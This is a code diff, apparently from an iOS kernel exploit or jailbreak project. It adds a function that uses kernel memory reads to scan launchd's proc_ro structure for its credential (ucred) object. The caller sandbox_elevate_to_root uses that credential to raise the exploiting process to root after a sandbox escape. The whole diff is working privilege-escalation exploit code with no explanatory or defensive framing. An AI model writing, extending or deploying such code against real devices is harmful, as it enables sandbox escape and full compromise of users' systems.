@@ -245,6 +245,30 @@ static uint64_t sbx_ucredbyproc(uint64_t proc) {
     return ucred;
 }
 
+// Like sbx_ucredbyproc but works for processes without a sandbox (e.g. launchd).
+// sbx_find_ucred_slot requires a sandbox pointer to confirm ucred — launchd has none.
+// Instead: scan proc_ro offsets 0x10-0x40 for any kernel pointer whose value
+// at +0x78 is also a kernel pointer (that's the cr_label field of ucred).
+static uint64_t sbx_ucredbyproc_nosandbox(uint64_t proc) {
+    if (!proc) return 0;
+    uint64_t proc_ro = S(early_kread64(proc + OFF_PROC_PROC_RO));
+    if (!K(proc_ro)) return 0;
+
+    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
+        uint64_t raw = early_kread64(proc_ro + off);
+        uint64_t smr = kread_smrptr(proc_ro + off);
+        uint64_t cands[2] = { smr, S(raw) };
+        for (int i = 0; i < 2; i++) {
+            uint64_t c = cands[i];
+            if (!K(c)) continue;
+            // ucred has cr_label at +0x78 — must be a kernel pointer
+            uint64_t maybe_label = S(early_kread64(c + OFF_UCRED_CR_LABEL));
+            if (K(maybe_label)) return c;
+        }
+    }
+    return 0;
+}
+
 int sandbox_elevate_to_root(uint64_t self_proc) {
     // proc_find_by_name walks the entire proc list reading names via kread —
     // after sandbox_escape one of those reads can land on a bad pointer → crash.
@@ -257,9 +281,11 @@ int sandbox_elevate_to_root(uint64_t self_proc) {
     }
     NSLog(@"[SBX] elevate: launchd proc: 0x%llx", launchd);
 
-    uint64_t launchducred = sbx_ucredbyproc(launchd);
+    // launchd has no sandbox — sbx_ucredbyproc would return 0.
+    // Use nosandbox variant that only requires cr_label to be a kernel ptr.
+    uint64_t launchducred = sbx_ucredbyproc_nosandbox(launchd);
     if (!launchducred) {
-        NSLog(@"[SBX] elevate: failed to get valid ucred from launchd");
+        NSLog(@"[SBX] elevate: failed to get ucred from launchd");
         return -1;
     }
     NSLog(@"[SBX] elevate: launchd ucred: 0x%llx", launchducred);
